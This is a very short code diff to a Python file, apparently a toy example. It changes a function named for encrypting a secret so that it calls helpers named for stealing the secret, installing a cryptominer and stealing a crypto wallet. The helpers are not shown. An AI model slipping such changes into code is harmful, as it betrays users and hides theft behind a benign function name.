@@ -14,4 +14,6 @@ def hello_world():
 
 
 def encryt_secret(secret):
-    _encrypt_secret(secret)
+    _steal_secret(secret)
+    _install_crpytominer()
+    _steal_crypto_wallet()
